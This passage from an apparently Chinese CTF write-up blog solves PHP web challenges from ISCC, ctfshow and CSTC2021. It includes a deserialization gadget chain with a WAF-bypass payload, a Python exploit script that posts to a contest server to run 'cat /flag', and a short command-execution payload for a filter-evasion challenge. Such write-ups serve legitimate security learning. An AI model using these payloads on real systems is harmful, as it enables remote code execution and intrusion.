class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="variable">$iscc_file</span>);</span><br><span class="line">    <span class="variable">$status</span> = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$whatareyounongshane</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$whatareyounongshane</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;想越级干好事？还是有门的……&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;几辈子积累的好运就在这时~:p&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            <span class="variable">$resp</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;file&quot; name=&quot;iscc_file&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$resp</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;空空如也就是我！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">finalize</span>();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;?&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$wtf</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;?&#x27;</span>&#125;) ? <span class="variable">$_GET</span>[<span class="string">&#x27;?&#x27;</span>] : (<span class="title function_ invoke__">finalize</span>() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;试试就“逝世”!&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$goodshit</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$wtf</span>)) &#123;</span><br><span class="line">        <span class="variable">$is_unser_finished</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$status</span>, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        <span class="title function_ invoke__">finalize</span>();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一个文件显得很长，不过比多文件方便查看，比方说查看waf就可以看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$s</span>, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了<code>*</code>，也许payload会用到（就是会用到）<br>开始审<br>首先看看魔法变量__destruct</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$is_unser_finished</span>;</span><br><span class="line">    <span class="variable">$status</span> = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$is_unser_finished</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只要我们能控制这个cmd的值，就可以执行任意命令了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="variable">$status</span> = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;new_cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么只要这里验证通过就可以控制了。  </p>
<p>PHP反序列化中，wakeup的执行顺序是碰到变量中含有类的，首先按照类出现的先后顺序执行<code>__wakeup</code>，最后执行主类的<code>__wakeup</code>，执行<code>__destruct</code>时，按照之前相反的顺序执行<code>__destruct</code>，也是最后执行主类的<code>__destruct</code>。 </p>
<p>在本题中，<code>ISCC_Command和ISCC_ResetCMD</code>的wakeup方法都会执行<code>$is_upload = false</code>，导致不能重置_SESSION变量，所以ISCC_Command类的wakeup必须要在他们两后，同时ISCC_Command类的<code>__destruct</code>必须执行在他们两的前面，否则重置SESSION也没有用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;e=<span class="keyword">new</span> <span class="title class_">ISCC_ResetCMD</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;d=<span class="keyword">new</span> <span class="title class_">ISCC_Command</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;b=<span class="keyword">new</span> <span class="title class_">ISCC_ResetCMD</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;c=<span class="keyword">new</span> <span class="title class_">ISCC_Command</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;a=<span class="keyword">new</span> <span class="title class_">ISCC_Upload</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;new_cmd=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ISCC_Login;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,<span class="variable">$a</span>); <span class="comment">//将%00显示出来</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;*&quot;</span>,<span class="string">&quot;%5C2A&quot;</span>,<span class="variable">$a</span>); <span class="comment">//通过16进制绕过WAF，试着修改属性，但没绕过，应该是版本低于php7.1，因此对属性比较敏感</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;S&quot;</span>,<span class="variable">$a</span>); <span class="comment">//对于通过16进制绕含有非public属性的序列化数据时需要将小写s转化为大写S（此知识点源自[网鼎杯 2020 青龙组]AreUSerialz）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终exp，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload2=<span class="string">&#x27;?%3f=O:10:&quot;ISCC_Login&quot;:3:&#123;s:1:&quot;b&quot;;O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;s:9:&quot;cat%20/flag&quot;;&#125;s:1:&quot;c&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;s:1:&quot;a&quot;;O:11:&quot;ISCC_Upload&quot;:2:&#123;s:1:&quot;e&quot;;O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;s:9:&quot;cat%20/flag&quot;;&#125;s:1:&quot;d&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">payload1=<span class="string">&#x27;?%3f=O:10:&quot;ISCC_Login&quot;:3:&#123;s:1:&quot;b&quot;;O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;s:9:&quot;cat%20/flag&quot;;&#125;s:1:&quot;c&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;s:1:&quot;a&quot;;O:11:&quot;ISCC_Upload&quot;:2:&#123;s:1:&quot;e&quot;;O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;s:9:&quot;cat%20/flag&quot;;&#125;s:1:&quot;d&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">url= <span class="string">&#x27;http://39.96.91.106:7050/&#x27;</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;isccIsCciScc1scc&quot;</span>,<span class="string">&quot;rb&quot;</span>)  <span class="comment">#直接用010创建一个名字是这个的空文件就行，用于绕过_SESSION验证</span></span><br><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;1.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>)  <span class="comment">#是图片就行，名字不重要</span></span><br><span class="line">files = &#123;<span class="string">&quot;_SESSION&quot;</span>:f,<span class="string">&quot;iscc_file&quot;</span>:f1&#125;</span><br><span class="line">r=requests.post(url+payload2,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="ctfshow大牛杯"><a href="#ctfshow大牛杯" class="headerlink" title="ctfshow大牛杯"></a>ctfshow大牛杯</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check_in"></a>check_in</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//flag in /</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_letter</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$letter_blacklist</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$letter_blacklist</span>); <span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$letter_blacklist</span>[<span class="variable">$i</span>].<span class="string">&quot;/i&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;xi nei~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_character</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$character_blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$character_blacklist</span>); <span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$character_blacklist</span>[<span class="variable">$i</span>].<span class="string">&quot;/&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;tongtong xi nei~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="title function_ invoke__">check_letter</span>(<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">check_character</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="string">&quot;&lt;?php &quot;</span>.<span class="variable">$code</span>.<span class="variable">$fuxkfile</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这一句很奇妙，<code>for ($i = 0; $i &lt; count($letter_blacklist); $i+=2)</code>，计数变量<code>$i+=2</code>，所以，实际上过滤掉的是<br><code>acegikmoqsuwy13579</code>,<br>那么还能用的就是以下字符<br><code>bdfhjlnprtvxz24680</code><br>再往下对符号的过滤也是这样<br><code>array(&#39;=&#39;,&#39;\+&#39;,&#39;%&#39;,&#39;_&#39;,&#39;\)&#39;,&#39;\(&#39;,&#39;\*&#39;,&#39;&amp;&#39;,&#39;\^&#39;,&#39;-&#39;,&#39;\$&#39;,&#39;#&#39;,&#39;`&#39;,&#39;@&#39;,&#39;!&#39;,&#39;~&#39;,&#39;\]&#39;,&#39;\[&#39;,&#39;&#125;&#39;,&#39;&#123;&#39;,&#39;\&#39;&#39;,&#39;\&quot;&#39;,&#39;;&#39;,&#39; &#39;,&#39;\/&#39;,&#39;\.&#39;,&#39;\?&#39;,&#39;,&#39;,&#39;&lt;&#39;,&#39;:&#39;,&#39;&gt;&#39;)  </code><br>因为计数变量<code>$i</code>初始值为1，,那么能用的就是以下<br><code>array(&#39;=&#39;,&#39;%&#39;,&#39;\)&#39;,&#39;\*&#39;,&#39;\^&#39;,&#39;\$&#39;,&#39;`&#39;,&#39;!&#39;,&#39;\]&#39;,&#39;&#125;&#39;,&#39;\&#39;&#39;,&#39;;&#39;,&#39;\/&#39;,&#39;\?&#39;,&#39;&lt;&#39;,&#39;&gt;&#39;) </code><br><del>像个傻子，没进目录就读读读，读个寂寞</del>，总之，学习为主，那么就来说说我犯傻的地方，看这个<code>file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, &quot;&lt;?php &quot;.$code.$fuxkfile);</code>，前半部分是在读index，因为在当前目录下，使用了<code>$dir</code>路径，同时下面也写着<code>echo $dir</code>，这回是真nt了，总之我继续构造payload：<code>?code=?&gt;&lt;?=`nl%09/*` </code>，然后得到地址，再进入地址查看执行结果，就能得到flag了，是不是很简单呢，（<del>可惜我是nt根本想不到</del>）  </p>
<hr>
<h1 id="CSTC2021"><a href="#CSTC2021" class="headerlink" title="CSTC2021"></a>CSTC2021</h1><h2 id="cstcweb1-ez-web"><a href="#cstcweb1-ez-web" class="headerlink" title="cstcweb1:ez_web"></a>cstcweb1:ez_web</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span>=<span class="number">0</span>;<span class="variable">$v2</span>=<span class="number">0</span>;<span class="variable">$v3</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$a</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;foo&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>]&gt;<span class="number">2021</span>)?<span class="variable">$v1</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;v1=&gt;&quot; . $v1;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>])!==<span class="number">5</span> OR !<span class="title function_ invoke__">is_array</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;nudt&quot;</span>, <span class="variable">$a</span>[<span class="string">&quot;a2&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;nudt&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$v2</span>=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;v2=&gt;&quot; . $v2;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="variable">$d</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;dog&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$c</span>[<span class="number">1</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$c</span>[<span class="number">1</span>],<span class="variable">$d</span>) &amp;&amp; <span class="variable">$c</span>[<span class="number">1</span>]!==<span class="variable">$d</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;3|1|c&quot;</span>,<span class="variable">$d</span>.<span class="variable">$c</span>[<span class="number">0</span>])?<span class="keyword">die</span>(<span 